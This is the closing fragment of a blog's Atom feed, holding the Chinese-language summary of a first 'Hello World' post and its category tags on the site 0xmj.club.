        &lt;p&gt;description:&lt;br&gt;和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！&lt;/p&gt;
&lt;hr&gt;

      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="first-blog" scheme="http://0xmj.club/tags/first-blog/"/>
    
  </entry>
  
</feed>
